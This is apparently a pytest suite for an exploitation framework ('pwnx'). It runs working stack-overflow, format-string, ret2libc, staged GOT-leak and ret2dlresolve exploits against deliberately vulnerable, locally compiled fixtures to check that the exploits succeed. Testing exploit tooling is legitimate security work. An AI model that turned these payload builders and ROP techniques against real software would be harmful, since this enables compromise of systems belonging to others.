from __future__ import annotations

import os
import re
import select
import struct
import subprocess
import time
from pathlib import Path

from pwnx.artifacts import Image
from pwnx.expressions import BindingContext
from pwnx.payload import Payload
from pwnx.techniques import ROPCompiler, build_dlresolve


def _symbol(path: Path, name: str) -> int:
    output = subprocess.check_output(["nm", "-n", str(path)], text=True)
    for line in output.splitlines():
        fields = line.split()
        if len(fields) >= 3 and fields[2] == name:
            return int(fields[0], 16)
    raise AssertionError(f"symbol {name!r} not found in {path}")


def _dynamic_symbol(path: Path, name: str) -> int:
    output = subprocess.check_output(
        ["nm", "-D", "--defined-only", str(path)],
        text=True,
    )
    for line in output.splitlines():
        fields = line.split()
        if len(fields) >= 3 and fields[2].split("@", 1)[0] == name:
            return int(fields[0], 16)
    raise AssertionError(f"dynamic symbol {name!r} not found in {path}")


def _plt(path: Path, name: str) -> int:
    output = subprocess.check_output(["objdump", "-d", str(path)], text=True)
    match = re.search(rf"^([0-9a-f]+) <{re.escape(name)}@plt>:", output, re.MULTILINE)
    if match is None:
        raise AssertionError(f"PLT entry {name!r} not found in {path}")
    return int(match.group(1), 16)


def _got(path: Path, name: str) -> int:
    output = subprocess.check_output(["readelf", "-rW", str(path)], text=True)
    for line in output.splitlines():
        fields = line.split()
        if fields and any(field.split("@", 1)[0] == name for field in fields[4:]):
            return int(fields[0], 16)
    raise AssertionError(f"GOT relocation {name!r} not found in {path}")


def _libc_path() -> Path:
    result = subprocess.check_output(
        ["gcc", "-print-file-name=libc.so.6"],
        text=True,
    ).strip()
    path = Path(result).resolve()
    if not path.is_file():
        raise AssertionError(f"compiler returned invalid libc path: {result}")
    return path


def _read_exact(stream, size: int, timeout: float = 3.0) -> bytes:
    data = bytearray()
    deadline = time.monotonic() + timeout
    while len(data) < size:
        remaining = deadline - time.monotonic()
        assert remaining > 0, f"timed out after reading {bytes(data)!r}"
        ready, _, _ = select.select([stream], [], [], remaining)
        assert ready, f"timed out after reading {bytes(data)!r}"
        chunk = os.read(stream.fileno(), size - len(data))
        assert chunk, f"EOF after reading {bytes(data)!r}"
        data.extend(chunk)
    return bytes(data)


def _read_until(stream, delimiter: bytes, timeout: float = 3.0) -> bytes:
    data = bytearray()
    deadline = time.monotonic() + timeout
    while delimiter not in data:
        remaining = deadline - time.monotonic()
        assert remaining > 0, f"timed out after reading {bytes(data)!r}"
        ready, _, _ = select.select([stream], [], [], remaining)
        assert ready, f"timed out after reading {bytes(data)!r}"
        chunk = os.read(stream.fileno(), 1)
        assert chunk, f"EOF after reading {bytes(data)!r}"
        data.extend(chunk)
    return bytes(data)


def _send(process: subprocess.Popen[bytes], data: bytes) -> None:
    assert process.stdin is not None
    process.stdin.write(data)
    process.stdin.flush()


def _qword(*values: int) -> bytes:
    return b"".join(struct.pack("<Q", value) for value in values)


def _format_string_offset(binary: Path) -> int:
    marker = 0x4242424241414141
    for position in range(1, 80):
        payload = f"AAAABBBB%{position}$p\n".encode()
        output = subprocess.check_output([str(binary)], input=payload, timeout=3)
        if f"0x{marker:x}".encode() in output:
            return position
    raise AssertionError("could not find the format-string buffer on the stack")


def _format_qword_write(first_buffer_arg: int, target: int, value: int) -> bytes:
    chunks = [(value >> (16 * index)) & 0xFFFF for index in range(4)]
    ordered = sorted(enumerate(chunks), key=lambda item: (item[1], item[0]))

    first_address_arg = first_buffer_arg
    while True:
        written = 0
        pieces: list[str] = []
        addresses: list[int] = []
        for address_index, halfword in ordered:
            delta = (halfword - written) & 0xFFFF
            if delta:
                pieces.append(f"%1${delta}c")
                written = halfword
            argument = first_address_arg + len(addresses)
            pieces.append(f"%{argument}$hn")
            addresses.append(target + address_index * 2)

        encoded = "".join(pieces).encode() + b"\0"
        padded = encoded.ljust((len(encoded) + 7) & ~7, b"\0")
        calculated = first_buffer_arg + len(padded) // 8
        if calculated == first_address_arg:
            return padded + _qword(*addresses)
        first_address_arg = calculated


def test_ret2win_contract_is_a_real_control_flow_hijack(
    compiled_fixtures: dict[str, Path],
) -> None:
    binary = compiled_fixtures["ret2win"]
    process = subprocess.Popen(
        [str(binary)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    assert process.stdout is not None

    _read_until(process.stdout, b"payload: ")
    payload = b"A" * 72 + _qword(
        _symbol(binary, "gadget_ret"),
        _symbol(binary, "win"),
    )
    _send(process, payload)

    assert _read_until(process.stdout, b"PWNX_RET2WIN_OK\n").endswith(
        b"PWNX_RET2WIN_OK\n"
    )
    assert process.wait(timeout=3) == 0


def test_native_rop_compiler_exploits_ret2win_fixture(
    compiled_fixtures: dict[str, Path],
) -> None:
    binary = compiled_fixtures["ret2win"]
    image = Image(binary)
    chain = ROPCompiler(image).call(image.win(), entry_sp_mod16=0)
    payload = Payload().pad(72).append(chain).build(BindingContext())

    process = subprocess.Popen(
        [str(binary)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    assert process.stdout is not None
    _read_until(process.stdout, b"payload: ")
    _send(process, payload)

    assert b"PWNX_RET2WIN_OK\n" in _read_until(process.stdout, b"PWNX_RET2WIN_OK\n")
    assert process.wait(timeout=3) == 0


def test_format_string_contract_performs_a_real_arbitrary_write(
    compiled_fixtures: dict[str, Path],
) -> None:
    binary = compiled_fixtures["format_string"]
    first_buffer_arg = _format_string_offset(binary)
    payload = _format_qword_write(
        first_buffer_arg,
        _symbol(binary, "hook"),
        _symbol(binary, "win"),
    )

    output = subprocess.check_output([str(binary)], input=payload, timeout=3)
    assert b"PWNX_FMT_OK\n" in output
    assert b"PWNX_FMT_SAFE\n" not in output


def test_direct_observation_contract_rebases_libc_and_calls_system(
    compiled_fixtures: dict[str, Path],
) -> None:
    binary = compiled_fixtures["direct_libc"]
    libc = _libc_path()
    process = subprocess.Popen(
        [str(binary)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    assert process.stdout is not None

    startup = _read_until(process.stdout, b"payload: ")
    match = re.search(rb"puts: (0x[0-9a-f]+)\n", startup)
    assert match is not None
    leaked_puts = int(match.group(1), 16)
    libc_base = leaked_puts - _dynamic_symbol(libc, "puts")

    ret = _symbol(binary, "gadget_ret")
    payload = b"A" * 72 + _qword(
        _symbol(binary, "gadget_pop_rdi"),
        _symbol(binary, "direct_command"),
        ret,
        libc_base + _dynamic_symbol(libc, "system"),
        ret,
        _symbol(binary, "main"),
    )
    _send(process, payload)

    assert b"PWNX_DIRECT_OK\n" in _read_until(process.stdout, b"PWNX_DIRECT_OK\n")
    process.kill()
    process.wait(timeout=3)


def test_native_binding_and_rop_compiler_use_a_runtime_libc_observation(
    compiled_fixtures: dict[str, Path],
) -> None:
    binary = compiled_fixtures["direct_libc"]
    libc_path = _libc_path()
    executable = Image(binary)
    libc = Image(libc_path, name="libc")
    process = subprocess.Popen(
        [str(binary)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    assert process.stdout is not None

    startup = _read_until(process.stdout, b"payload: ")
    match = re.search(rb"puts: (0x[0-9a-f]+)\n", startup)
    assert match is not None

    bindings = BindingContext(instance_id="direct-fixture")
    bindings.bind(libc.puts, int(match.group(1), 16), source="startup puts leak")
    chain = ROPCompiler((executable, libc)).call(
        libc.system("echo PWNX_DIRECT_OK"),
        entry_sp_mod16=0,
    )
    payload = Payload().pad(72).append(chain).build(bindings)
    _send(process, payload)

    assert b"PWNX_DIRECT_OK\n" in _read_until(process.stdout, b"PWNX_DIRECT_OK\n")
    process.kill()
    process.wait(timeout=3)


def test_staged_contract_leaks_libc_then_calls_system(
    compiled_fixtures: dict[str, Path],
) -> None:
    binary = compiled_fixtures["staged_libc"]
    libc = _libc_path()
    process = subprocess.Popen(
        [str(binary)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    assert process.stdout is not None

    _read_until(process.stdout, b"payload: ")

    ret = _symbol(binary, "gadget_ret")
    stage1 = b"A" * 72 + _qword(
        _symbol(binary, "gadget_pop_rdi"),
        1,
        _symbol(binary, "gadget_pop_rsi"),
        _got(binary, "puts"),
        _symbol(binary, "gadget_pop_rdx"),
        8,
        ret,
        _plt(binary, "write"),
        ret,
        _symbol(binary, "main"),
    )
    _send(process, stage1)

    leaked_puts = struct.unpack("<Q", _read_exact(process.stdout, 8))[0]
    _read_until(process.stdout, b"payload: ")

    libc_base = leaked_puts - _dynamic_symbol(libc, "puts")
    system = libc_base + _dynamic_symbol(libc, "system")
    stage2 = b"B" * 72 + _qword(
        _symbol(binary, "gadget_pop_rdi"),
        _symbol(binary, "stage2_command"),
        ret,
        system,
        ret,
        _symbol(binary, "main"),
    )
    _send(process, stage2)

    assert b"PWNX_STAGE2_OK\n" in _read_until(
        process.stdout,
        b"PWNX_STAGE2_OK\n",
    )
    process.kill()
    process.wait(timeout=3)


def test_fixture_metadata_matches_planner_assumptions(
    compiled_fixtures: dict[str, Path],
) -> None:
    ret2win = compiled_fixtures["ret2win"]
    dlresolve = compiled_fixtures["dlresolve"]
    direct = compiled_fixtures["direct_libc"]
    fmt = compiled_fixtures["format_string"]

    assert _symbol(ret2win, "win") > 0x400000
    assert _plt(dlresolve, "read") > 0x400000
    assert _symbol(direct, "direct_command") > 0x400000
    assert _symbol(fmt, "hook") > 0x400000

    dlresolve_relocations = subprocess.check_output(
        ["readelf", "-rW", str(dlresolve)],
        text=True,
    )
    assert " read@" in dlresolve_relocations
    assert " write@" not in dlresolve_relocations


def test_native_dlresolve_builder_executes_a_resolved_symbol(
    compiled_fixtures: dict[str, Path],
) -> None:
    binary = compiled_fixtures["dlresolve"]
    image = Image(binary)
    compiled = build_dlresolve(
        image,
        "system",
        ["echo PWNX_DLRESOLVE_OK"],
        data_addr=image.symbols["dlresolve_scratch"] + 0x100,
        entry_sp_mod16=0,
    )
    payload = Payload().pad(72).append(compiled.first_stage).build(BindingContext())

    process = subprocess.Popen(
        [str(binary)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    assert process.stdout is not None
    _read_until(process.stdout, b"payload: ")
    _send(process, payload)
    time.sleep(0.05)
    _send(process, compiled.data)

    assert b"PWNX_DLRESOLVE_OK\n" in _read_until(
        process.stdout,
        b"PWNX_DLRESOLVE_OK\n",
    )
    process.kill()
    process.wait(timeout=3)

